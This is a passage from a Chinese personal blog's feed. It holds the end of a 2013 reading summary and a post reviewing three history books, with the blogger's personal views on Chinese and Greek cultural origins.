&lt;p&gt;一部很好的硅谷发展史，这样说可能有点不准确，在第二版中，也描述一些不在硅谷的企业，像微软、腾讯等。要说是计算机科技发展史也不是很准确，它其中也包含了一些硅谷中的生物科技企业，以及华尔街一些风投公司。&lt;/p&gt;

&lt;p&gt;《浪潮之巅》第二版分上下两册，上册介绍了硅谷中的一些明星企业的兴衰，像AT&amp;amp;T、IBM、摩托罗拉、诺基亚等，以及一些不在硅谷却对计算机科学领域影响巨大的企业，像微软。&lt;/p&gt;

&lt;p&gt;下册写的就比较杂了，有关于硅谷风投情况的篇章，也有新型互联网企业的崛起，像谷歌、facebook、twitter、腾讯等，还有对于未来高科技发展的预测。&lt;/p&gt;

&lt;p&gt;我读这本书获取的信息点，总结一下可以得到以下内容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;作者看好小米能在移动互联网时代，成为像dell那样的企业。&lt;/li&gt;
  &lt;li&gt;作者认为在web2.0的竟争中，中国最具有可能成为像google那样的明星企业潜质的公司是腾讯和阿里巴巴&lt;/li&gt;
  &lt;li&gt;作者内心中认为fackebook正在衰退，web2.0竞争相当激烈，一轮更大的泡沫正在来袭&lt;/li&gt;
  &lt;li&gt;腾讯在社交类网站的盈利模式是facebook的老师&lt;/li&gt;
  &lt;li&gt;未来新能源发展不了多快，核能其实要比太阳能更清洁&lt;/li&gt;
  &lt;li&gt;创造性工作获得财富的人，要比那些靠资产挪移获得财富的人更值得尊敬（&lt;strong&gt;这点我真表赞同&lt;/strong&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;如果你是一名计算机领域的工作者，或者将要进入计算机领域工作的人，这本书可能帮你很好的了解这个领域的发展，而且不会想课堂上那么枯燥乏味。也许随着时间的流失，其中的一些预测会失去意义，但其中所给予计算机思想是不会过时的&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##《中国国民性演变历程》&lt;/p&gt;

&lt;p&gt;全书分为三部分，第一部分描述了中国历朝历代的国民性特点，以及政治、文化、经济等环境。&lt;strong&gt;第二篇是全书的高潮，直接给出了近代中国文化没落的原因——先天不足，让人有一种醍醐灌顶般的醒悟。&lt;/strong&gt;第三篇简单介绍了中国近代国民性改进的情况。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;这本书和之前两本历史书一样，都在在《2013年我读过的历史书》对它有较为详细的描述和评价，这里就不多说了。PS：作为生活在现代的中国人，我们有必要了解我们自身所存在的先天问题，所以我极力推荐这本书。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##未读完的书&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;《社会工程:安全体系中的人性漏洞》&lt;/strong&gt;，社会工程学不一定都是要用到恶意用途当中的，它的一些学问可以帮助我们更好的处理日常生活，交际。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;《三体》三部曲&lt;/strong&gt;，理工科男生不得不看的一部小说，所有的介绍语言都是多余的，一句话，&lt;strong&gt;就是牛逼&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;《社会工程:安全体系中的人性漏洞》刚看了一半，《三体》三部曲刚看完了第一部《地球往事》，等我看完在来写读后感吧。&lt;/p&gt;

&lt;p&gt;##总结&lt;/p&gt;

&lt;p&gt;写总结真心虐=_=，不过我还是很佩服我能看完这么多书，毕竟我就没有过读纸质书的习惯。&lt;/p&gt;

&lt;p&gt;2013年的这些书总的来看，历史书三本、科技类文学一本、哲学书一套、小说一本、管理类书一本，大多是用来休闲的，而对于可以用来实践的书的内容，实践做的太少了（《高效能人士的七个习惯》）。&lt;/p&gt;

&lt;p&gt;2014年数量的计划就不提了，毕竟看书是用来放松的，压力太大会不爽的，不过至少要把自己13年挖的坑填上（买了好多书还没看呢=_=）。另外，技术相关的书应该有几本，提高自己的能力。实践类的书看完要多练习，纸上谈兵弱爆了。《高效能人士的七个习惯》再读一到两遍。&lt;/p&gt;

&lt;p&gt;对了，最好能找到几个女孩喜欢的事情作为爱好（跟女孩的谈资太少了ヽ(´o｀；）。&lt;strong&gt;PS:忽略这一条，跟本文无关。。。&lt;/strong&gt;&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>2013年我读过的历史书</title>
   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/01/28/2013%E5%B9%B4%E6%88%91%E8%AF%BB%E8%BF%87%E7%9A%84%E5%8E%86%E5%8F%B2%E4%B9%A6.html"/>
   <updated>2014-01-28T02:04:34+08:00</updated>
   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/01/28/2013年我读过的历史书</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/3f18819bjw1ecvv4h3kpzj20sg0nsq9a.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;读完《&lt;a href=&quot;http://www.amazon.cn/gp/product/B00D406VWO/ref=cm_cr_ryp_prd_ttl_sol_4&quot;&gt;中国国民性演变历程&lt;/a&gt;》这本书很久了，早就想写篇读后感，不过春节放假前各种事情和聚会，一直拖到现在终于有时间了。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;从13年5月开始恢复了阅读纸质书的习惯，看了3本中国历史相关的书，分别是《&lt;a href=&quot;http://www.amazon.cn/%E8%AE%BA%E4%B8%AD%E5%9B%BD-%E4%BA%A8%E5%88%A9%E2%80%A2%E5%9F%BA%E8%BE%9B%E6%A0%BC/dp/B009AL1FPE/ref=sr_1_1?ie=UTF8&amp;amp;qid=1390628477&amp;amp;sr=8-1&amp;amp;keywords=%E8%AE%BA%E4%B8%AD%E5%9B%BD&quot;&gt;论中国&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/gp/product/B006DVQKCC/ref=cm_cr_ryp_prd_ttl_sol_6&quot;&gt;浩荡两千年&lt;/a&gt;》和《&lt;a href=&quot;http://www.amazon.cn/gp/product/B00D406VWO/ref=cm_cr_ryp_prd_ttl_sol_4&quot;&gt;中国国民性演变历程&lt;/a&gt;》。三本书给我带来了对中国过去、现在、将来不同程度的思考。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;论中国&quot;&gt;《论中国》&lt;/h2&gt;

&lt;p&gt;《论中国》从一个“敌对”国家外交家的视角来看待中国近代、当代的政治、经济、文化的变迁，以及西方文化所不能理解的一些中式思维。这本书的主要的切入角度是&lt;strong&gt;政治&lt;/strong&gt;，对于历史的描述可能会有些失真，但是我们只要和一些中式描述相对照，还是可以看到一些平常不会听到的内容。&lt;/p&gt;

&lt;p&gt;比如，从鸦片战争一直到冷战结束，俄罗斯（前苏联）一直对于我们虎视眈眈。可笑的是，我们曾经把他当做最为可靠盟友（老大哥）。&lt;/p&gt;

&lt;h2 id=&quot;浩荡两千年&quot;&gt;《浩荡两千年》&lt;/h2&gt;

&lt;p&gt;《浩荡两千年》和《论中国》一样，也不是一本专门叙述历史的书，而是从经济的角度切入，探索中国工商文明的发展过程。本来看了前言说这本书是讲商业的，阅读兴趣一落千丈，但是读了第一章之后，让我如醉如痴，不到一周的时间就把这本书翻完了。&lt;/p&gt;

&lt;p&gt;这本书向我们提出了很多质疑中国历史文化的好问题。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;为什么在春秋时期商业已经超越了欧洲千年的程度，但现在却一落千丈？&lt;/li&gt;
  &lt;li&gt;为什么中国会处于一种分久必合，合久必分的奇怪循环之中？&lt;/li&gt;
  &lt;li&gt;为什么中国的商人从没有真正的登上过历史舞台，而那些有可能达到这一目标的商人为什么都以悲惨的故事结尾？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有了这么多的疑问，让我不断的想找到答案。我想大多数的中国人也和我一样，非常奇怪为什么一直航行在世界前方的中国，突然丢失了罗盘，和现代文明擦身而过？&lt;/p&gt;

&lt;h2 id=&quot;中国国民性演变历程&quot;&gt;《中国国民性演变历程》&lt;/h2&gt;

&lt;p&gt;《中国国民性演变历程》帮我找到了这些问题的答案——文化走向的不同、历史的必然性。这本书的第二篇，对比了中国文化和希腊文化的起源环境、发展走向的不同，这些不同最终使两大文化分道扬镳，各奔东西。&lt;/p&gt;

&lt;h4 id=&quot;中国文化起源&quot;&gt;中国文化起源&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;中国文化的起源环境——物种丰富，土壤肥沃，依靠河流——生存条件优越。这就导致中国人的生存，只需要找到利用这良好环境的方法，而无需承担太多的风险。因此形成了中国文化中最重要的一个内容——信奉祖先。因为活的越久的人，所拥有的“生存方法”就越多，而这条文化最终孕育了专制。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;希腊文化起源&quot;&gt;希腊文化起源&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;希腊文化的起源环境——物种稀少，土地贫瘠，紧邻大海——生存条件恶劣。这导致了希腊人为了生存，不得不出海去探索能够生存的地方。由于出海探索，对于体力有很大的要求，累赘可能会害的一船人都丧命，所以老年人很难参与。而且航海对于同伴的可靠要求也很高，所以希腊的契约文化也由此而形成，而这条文化则最终孕育出了现代民主雏形。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;思考&quot;&gt;思考&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;单单从文化起源的这一点，再结合一些历史内容，我们不难发现，中国的思想先哲们一直在寻求专制的真理，而希腊文化及其衍生文化的领袖们一直在需找打破专制的真理。由此可见，中国文化和西方文化在形成的时候便分别走了两条完全相反的路。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;读后感&quot;&gt;读后感&lt;/h2&gt;

&lt;p&gt;以我目前的理解来说，现代文明是由希腊文化所引导的。而中国文化只是众多世界文化的一种，对世界发展没有太强的引导力，就好像烹饪对于糖的需求，少了它也许会失去一种体验，但它绝不是必须的，至少现在是。&lt;/p&gt;

&lt;p&gt;中国文化先哲们的思想层面，是背离世界文化前行方向的。但是一些方法论，在经过现在科学的验证，也许还是有一些不错的。我也因此，改变了自己原来的一些思维，比如：中医治本，西医治标论。&lt;/p&gt;

&lt;p&gt;《论中国》和《浩荡两千年》帮助我们提出了问题，《中国国民性演变历程》帮助我们给出了答案。这三本书让我开始对历史纵剖面进行描述、剖析的历史书（所谓纵剖面，就是以时间线为引，纵向的切开历史，来观看历史发展的历程；反之，专注于某一时期的历史，我称之为横截面），也开始有想了解西方历史的冲动。&lt;/p&gt;

&lt;p&gt;最近买了一本《&lt;a href=&quot;http://www.amazon.cn/%E4%BD%A0%E4%B8%80%E5%AE%9A%E7%88%B1%E8%AF%BB%E7%9A%84%E6%9E%81%E7%AE%80%E6%AC%A7%E6%B4%B2%E5%8F%B2-%E7%BA%A6%E7%BF%B0%E2%80%A2%E8%B5%AB%E6%96%AF%E7%89%B9/dp/B008FV39WW/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1390636751&amp;amp;sr=1-1&amp;amp;keywords=%E6%9E%81%E7%AE%80%E6%AC%A7%E6%B4%B2%E5%8F%B2&quot;&gt;极简欧洲史&lt;/a&gt;》，打算年后回来看。之前在多看上看过它的样张，感觉讲的比较有趣，不是很枯燥。&lt;/p&gt;

&lt;p&gt;2012年的我肯定很难想象我居然可以在2013的下半年中，看完三本不是很薄的历史书，和不少其他的内容的书。而且看这些书没有给我带来任何负担的感觉，反而给我带来一种享受的感觉。&lt;/p&gt;

&lt;p&gt;等放假回家后，整理下自己这段时间的读的书。&lt;/p&gt;

</content>
 </entry>
 

</feed>
